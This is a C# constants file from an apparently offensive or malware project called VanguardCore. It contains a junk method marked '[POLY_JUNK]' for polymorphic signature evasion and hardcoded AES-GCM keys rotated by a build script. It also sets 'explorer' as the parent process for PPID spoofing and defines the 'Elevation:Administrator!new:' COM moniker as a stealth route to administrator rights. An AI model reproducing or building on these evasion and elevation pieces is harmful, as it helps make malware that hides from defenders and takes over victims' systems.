using System;

namespace VanguardCore
{
    public static class Constants
    {
        // [POLY_JUNK]
        private static void _vanguard_d77cf33d() {
            int val = 72351;
            if (val > 50000) Console.WriteLine("Hash:" + 72351);
        }

        // These keys are updated at build time by full_rebuild.ps1
        // AES-GCM Keys (Base64)
        public const string MASTER_KEY_B64 = "ceB/Dx3+6a9C98r6HjvXUgLevq/3PchwIwWiloW8XqA=";
        public const string ENCRYPTED_SESSION_KEY_B64 = "EWEgEhF0nzej2AiYcl3zjg44yhtCAgI8N07EtKhP+pY=";
        
        // Target process name for PPID spoofing
        public const string SPOOF_PARENT = "explorer";
        
        // Stealth Monikers
        public const string MONIKER_PREFIX = "Elevation:Administrator!new:";
    }
}









































































